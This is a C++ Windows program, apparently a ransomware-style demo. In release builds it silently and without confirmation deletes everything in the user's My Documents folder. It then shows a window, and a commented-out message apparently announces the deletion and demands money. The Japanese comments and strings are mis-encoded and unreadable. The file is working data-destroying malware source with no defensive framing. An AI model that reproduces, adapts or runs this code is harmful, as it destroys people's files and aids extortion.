#include<Windows.h>
#include<ShlObj.h>
#include<string>
#include"TString.h"
#include"SimpleWindow.h"
//#include"resource.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE , LPSTR, int)
{
	// �t�H���_�[�̈ʒu�����邽�߂̃o�b�t�@ 
	TCHAR myDocumentsFolder[MAX_PATH];

	// �t�H���_�[�̈ʒu�̎擾 
	SHGetFolderPath(NULL, CSIDL_MYDOCUMENTS, NULL, NULL, myDocumentsFolder);

	/*
	//�{�ԗp
	int len = _tcslen(myDocumentsFolder);
	TCHAR *pszFrom = new TCHAR[len + 2];
	_tcscpy(pszFrom, myDocumentsFolder);
	pszFrom[len] = 0;
	pszFrom[len + 1] = 0;
	*/

	
	TCHAR testFilePath[] = TEXT("\\*");
	_tcscat(myDocumentsFolder, testFilePath);

	int len = _tcslen(myDocumentsFolder);
	TCHAR *pszFrom = new TCHAR[len + 2];
	_tcscpy(pszFrom, myDocumentsFolder);
	pszFrom[len] = 0;
	pszFrom[len + 1] = 0;



	// ���b�Z�[�W �{�b�N�X�Ƀt�H���_�[�̈ʒu��\�� 
	//MessageBox(nullptr, pszFrom, TEXT("�t�H���_�[�̈ʒu"), MB_OK);

	
	SHFILEOPSTRUCT deleteOp = {
		nullptr,
		FO_DELETE,
		pszFrom,
		nullptr,
		FOF_ALLOWUNDO | FOF_SILENT | FOF_NOCONFIRMATION /* FOF_SIMPLEPROGRESS */,
		false,
		nullptr,
		nullptr
	};
	
#ifndef _DEBUG
	int error = SHFileOperation(&deleteOp);
#endif

	Inferno::SimpleWindow window;
	window.Initialize();
	window.SetTitleText(_T("�����T���E�F�A�f��"));
	window.Show();

	/*
	MessageBox(nullptr, 
		TEXT("���Ȃ��̃f�[�^�͏�������܂����B\n�Ԃ��Ăق�����\n********�ɋ�10����U���݂Ȃ����B"), 
		TEXT("�f�[�^���������܂���"), 
		MB_ICONWARNING);
	*/

	delete pszFrom;

	MSG msg;
	while (true)
	{
		if (PeekMessage(&msg, NULL, 0, 0, PM_NOREMOVE))
		{
			//WM_QUITE��������GetMessage��0��Ԃ�
			if (!GetMessage(&msg, NULL, 0, 0)) break;
			TranslateMessage(&msg); //�L�[�{�[�h�֘A�̃��b�Z�[�W��|�󂷂�
			DispatchMessage(&msg); //OS�Ƀ��b�Z�[�W��n���i���E�B���h�E�v���V�[�W���ɓn���j
		}
		Sleep(1);
	}
	return msg.wParam; //��@

	return 0;
}